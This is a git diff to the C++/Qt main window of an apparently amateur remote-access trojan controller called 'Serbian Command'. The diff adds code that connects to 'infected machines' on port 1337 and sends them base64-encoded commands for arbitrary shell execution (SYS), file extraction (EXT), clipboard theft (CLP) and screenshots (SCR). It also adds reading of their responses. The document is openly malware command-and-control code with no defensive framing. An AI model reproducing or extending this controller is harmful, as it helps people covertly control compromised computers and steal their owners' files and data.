@@ -1,6 +1,33 @@
 #include "mainwindow.h"
 #include "ui_mainwindow.h"
 
+
+
+
+/*
+
+
+
+
+
+
+
+
+
+TODO: Load the DB into the treeview using std::queue
+      Setup the handler switching using switch
+      Define the read behavior according to the handlers -> new window like Information to print the result of a cmd
+
+
+
+
+
+
+
+
+
+*/
+
 /**
  * @brief MainWindow::MainWindow Constructor of the main window of the server
  * @param parent The parent widget of the new window
@@ -9,19 +36,20 @@ MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent)
     , ui(new Ui::MainWindow)
 {
+    //UI setup
     ui->setupUi(this);
     this->statusLabel = new QLabel("Waiting for a database to be loaded...");
     this->statusBar()->addWidget(statusLabel);
     this->loadedFile = nullptr;
 
-    //Network setupin.setDevice(socket);
-    in.setVersion(QDataStream::Qt_5_10);
+    this->networdHandler = NIL;
+
+    //Network setup
     this->clientSocket = new QTcpSocket(this);
-    this->in.setDevice(clientSocket);
-    this->in.setVersion(QDataStream::Qt_5_10);
 
     //Setting our error handler
     connect(clientSocket, QOverload<QTcpSocket::SocketError>::of(&QTcpSocket::error), this, &MainWindow::displayError);
+    connect(clientSocket, &QAbstractSocket::readyRead, this, &MainWindow::read);
     connect(clientSocket, &QAbstractSocket::disconnected, clientSocket, &QObject::deleteLater);
 
 }
@@ -59,13 +87,19 @@ void MainWindow::on_actionQuit_triggered()
  */
 void MainWindow::on_clipboardButton_clicked()
 {
-    this->statusLabel->setText("Sending CLP");
+    if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
+       QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
+       return;
+    }
+
+    this->statusLabel->setText("Sending CLP to " + this->selectedMachineName);
     QString cmd = QString("CLP").toUtf8().toBase64();
     resetStatusTimer(3);
-    std::cout << cmd.toStdString() << std::endl;
+
+    this->networdHandler = CLP;
 
     //Waiting for transmission to be over
-    ClipboardWindow* c = new ClipboardWindow(this);
+    ClipboardWindow* c = new ClipboardWindow(this, "returnStr");
     c->show();
     c->setFocus();
 }
@@ -75,12 +109,22 @@ void MainWindow::on_clipboardButton_clicked()
  */
 void MainWindow::on_connectButton_clicked()
 {
+    if(this->selectedMachineIp.isEmpty() || this->selectedMachineIp.isEmpty()){
+       if(this->ui->tableWidget->rowCount() == 0){
+         QMessageBox::information(this, "Serbian Command", "No machine to connect to");
+         return;
+       }
+
+      //Defaulting to the first machine
+      this->on_tableWidget_cellClicked(0,0);
+    }
     this->statusLabel->setText("Connecting to machine " + selectedMachineName + " on port 1337...");
+    if(this->clientSocket->state() == QAbstractSocket::ConnectedState){
+      this->clientSocket->close();
+    }
+    this->clientSocket->connectToHost(this->selectedMachineIp, 1337);
 
-    QString cmd = QString("CNT").toUtf8().toBase64();
     resetStatusTimer(3);
-
-    this->clientSocket->connectToHost("127.0.0.1", 1337);
 }
 
 /**
@@ -88,11 +132,16 @@ void MainWindow::on_connectButton_clicked()
  */
 void MainWindow::on_sendCmdButton_clicked()
 {
+    if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
+        QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
+        return;
+    }
     this->statusLabel->setText("Sending SYS:" + this->ui->cmdLine->text());
     QString cmd = ("SYS:" + this->ui->cmdLine->text()).toUtf8().toBase64();
 
     resetStatusTimer(3);
     sendCmd(cmd);
+    this->ui->cmdLine->setText("");
 }
 
 /**
@@ -100,6 +149,10 @@ void MainWindow::on_sendCmdButton_clicked()
  */
 void MainWindow::on_extractButton_clicked()
 {
+   if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
+      QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
+      return;
+   }
    this->statusLabel->setText("Sending EXT:" + this->ui->fileLine->text());
    QString cmd = ("EXT:" + this->ui->fileLine->text()).toUtf8().toBase64();
    resetStatusTimer(3);
@@ -111,6 +164,10 @@ void MainWindow::on_extractButton_clicked()
  */
 void MainWindow::on_screenshotButton_clicked()
 {
+  if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
+     QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
+     return;
+  }
   this->statusLabel->setText("Sending SCR");
   QString cmd = QString("SCR").toUtf8().toBase64();
   resetStatusTimer(3);
@@ -136,7 +193,7 @@ void MainWindow::on_actionLoad_triggered()
   loadedFile->close();
 
   QJsonDocument loadedJSON(QJsonDocument::fromJson(fileStr));
-  loadedJSON.object();
+  qDebug() << loadedJSON.object();
 
   resetStatusTimer(3);
 }
@@ -176,8 +233,7 @@ void MainWindow::on_actionSave_as_triggered()
 
 /**
  * @brief on_tableWidget_cellClicked Changes the selected machine attribute according to user input
- * @param row The row of the cell that has been c );
-licked on
+ * @param row The row of the cell that has been clicked on
  * @param column Unused
  */
 void MainWindow::on_tableWidget_cellClicked(int row, int column){
@@ -209,9 +265,7 @@ QJsonDocument* MainWindow::prepareJSON()
 
   mainJson["Machines"] = machineArray;
   QJsonDocument *JsonDoc = new QJsonDocument(mainJson);
-  void displayError(QTcpSocket::SocketError);
 
-  std::cout << (JsonDoc)->toJson().toStdString() << std::endl;
   return JsonDoc;
 }
 
@@ -246,30 +300,26 @@ void MainWindow::displayError(QTcpSocket::SocketError socketError)
         break;
     default:
         this->statusLabel->setText(this->selectedMachineName + ": Error");
-        QMessageBox::information(this, "Serbian Command", "The following error occurred:"); // + (this->socket->errorString()));
+        QMessageBox::information(this, "Serbian Command", "The following error occurred:" + (this->clientSocket->errorString()));
     }
-
+    this->clientSocket->close();
     resetStatusTimer(5);
 }
 
+/**
+ * @brief MainWindow::read Called when data arrives on the socket
+ */
 void MainWindow::read(){
-  if (blockSize == 0) {
-      // Relies on the fact that QDataStream serializes a quint32 into
-      // sizeof(quint32) bytes
-      if (clientSocket->bytesAvailable() < (int)sizeof(quint32))
-          return;
-      in >> blockSize;
-  }
-
-  if (clientSocket->bytesAvailable() < blockSize || in.atEnd())
-      return;
-
-  QString returnStr;
-  in >> returnStr;
+  QString returnStr = this->clientSocket->readAll();
+  qDebug() << returnStr;
 }
 
+/**
+ * @brief MainWindow::sendCmd Sends a command over the network to a remote machine using just a QString
+ * @param cmd The command to send to the remote machine
+ */
 void MainWindow::sendCmd(QString cmd){
-  this->clientSocket->write(cmd.toUtf8());
+  this->clientSocket->write((cmd + "\n").toUtf8());
   this->clientSocket->flush();
 }
 
@@ -285,6 +335,9 @@ void MainWindow::resetStatusTimer(int timeSec = 0){
  * @brief MainWindow::resetStatus Resets the status with a premade string of the type "Message + Number of machines in store"
  */
 void MainWindow::resetStatus(){
-  QString status = "Standing by. There are " + QString::number(this->ui->tableWidget->rowCount()) + " infected machines";
+  QString status = "Standing by. There are " + QString::number(this->ui->tableWidget->rowCount()) + " infected machines.";
+  if(this->clientSocket->state() == QAbstractSocket::ConnectedState){
+    status += (" Connected to machine " + this->selectedMachineName);
+  }
   this->statusLabel->setText(status);
 }
